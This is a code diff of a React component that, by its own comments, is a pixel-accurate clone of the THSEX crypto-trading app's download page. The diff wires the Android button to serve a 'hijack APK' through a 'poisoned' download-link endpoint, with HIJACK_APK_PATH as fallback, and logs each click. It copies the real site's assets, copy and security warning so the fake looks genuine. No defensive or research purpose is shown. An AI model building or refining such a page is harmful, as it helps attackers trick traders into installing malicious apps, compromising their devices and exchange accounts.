@@ -1,8 +1,9 @@
 "use client";
 
+import { useEffect, useState } from "react";
 import { HIJACK_APK_PATH } from "@/lib/config";
 
-type ApiRow = { type?: string; url?: string };
+type Links = Record<string, string>;
 
 async function logHit(action: string) {
   try {
@@ -16,77 +17,80 @@ async function logHit(action: string) {
   }
 }
 
-/** Standalone clone trap (no iframe) — backup if iframe blocked */
+/**
+ * Pixel-accurate clone of pages/downapp/index from THSEX app.
+ * Same assets (down11/22/33.png), same layout, same copy.
+ * Only Android button serves hijack APK via poisoned /api/downloadlink.
+ */
 export default function DownAppClone() {
-  async function handleAndroidDownload() {
-    try {
-      const res = await fetch("/api/proxy/downloadlink", { cache: "no-store" });
-      const json = await res.json();
-      const rows: ApiRow[] = Array.isArray(json.data) ? json.data : [];
-      const android = rows.find((r) => String(r.type || "").toLowerCase().includes("android"));
-      await logHit("clone_download_click");
-      window.location.href = android?.url || HIJACK_APK_PATH;
-    } catch {
-      await logHit("clone_download_fallback");
-      window.location.href = HIJACK_APK_PATH;
-    }
+  const [links, setLinks] = useState<Links>({});
+  const [downloading, setDownloading] = useState(false);
+
+  useEffect(() => {
+    fetch("/api/proxy/downloadlink", { cache: "no-store" })
+      .then((r) => r.json())
+      .then((json) => {
+        const map: Links = {};
+        if (Array.isArray(json.data)) {
+          for (const row of json.data) {
+            const t = String(row.type || "").toLowerCase();
+            if (t && row.url) map[t] = String(row.url);
+          }
+        }
+        setLinks(map);
+      })
+      .catch(() => setLinks({}));
+  }, []);
+
+  async function onAndroidClick() {
+    if (downloading) return;
+    setDownloading(true);
+    await logHit("android_download");
+
+    const url = links.android || HIJACK_APK_PATH;
+    window.location.href = url;
+  }
+
+  function onAppleClick() {
+    if (!links.apple || links.apple === "#") return;
+    window.location.href = links.apple;
   }
 
   return (
-    <div className="downapp-page">
-      <header className="downapp-nav">THSEX</header>
+    <div className="downapp-page page">
+      <div className="downapp-status-bar" />
 
-      <section className="downapp-hero">
-        <h1>
-          Digital asset trading -
-          <br />
-          <span>start trading</span>
-        </h1>
-        <p>
-          Install now and start trading immediately. Secure, fast, and built for mobile traders.
-        </p>
-        <div className="downapp-hero-img">
-          <div className="downapp-phone">
-            <div className="downapp-phone-screen">THSEX</div>
-          </div>
+      <div className="hero-block">
+        <div className="brand">THSEX</div>
+        <div className="hero-title">
+          <span>Start </span>
+          <span className="hero-title-highlight">Digital Asset Trading</span>
+          <span> New Route</span>
         </div>
-      </section>
+        <div className="hero-subtitle">
+          Digital asset trading - easy to start, simple and worry-free
+        </div>
+      </div>
 
-      <section className="downapp-card">
-        <button
-          type="button"
-          className="downapp-btn"
-          onClick={handleAndroidDownload}
-          aria-label="Download Android APK"
-        >
-          <img
-            src="/assets/icon_downapp.png"
-            alt="Download on the Android APK"
-            onError={(e) => {
-              const img = e.currentTarget;
-              img.style.display = "none";
-              const fb = img.nextElementSibling as HTMLElement | null;
-              if (fb) fb.style.display = "block";
-            }}
-          />
-          <span className="downapp-btn-fallback">Download on the Android APK</span>
+      <img className="hero-image" src="/assets/down11.png" alt="" />
+
+      <div className="download-card">
+        <button type="button" className="download-btn-wrap" onClick={onAppleClick}>
+          <img className="download-btn" src="/assets/down22.png" alt="Download on the App Store" />
         </button>
-
-        <button type="button" className="downapp-btn downapp-btn-disabled" disabled>
-          <img
-            src="/assets/download.png"
-            alt="Download on the App Store"
-            onError={(e) => {
-              e.currentTarget.style.display = "none";
-            }}
-          />
+        <button type="button" className="download-btn-wrap" onClick={onAndroidClick}>
+          <img className="download-btn" src="/assets/down33.png" alt="Download on the Android APK" />
         </button>
-      </section>
+      </div>
 
-      <p className="downapp-install">
-        Install now, <span>start trading</span>
-        <br />
-        Please do not disclose your password, SMS code, or Google verification code to anyone.
+      <div className="Install">
+        <span>Install now, </span>
+        <span className="Install-highlight">start trading</span>
+      </div>
+
+      <p className="downapp-disclaimer">
+        Please do not disclose your password, SMS code, or Google verification code to anyone,
+        including exchange staff.
       </p>
     </div>
   );
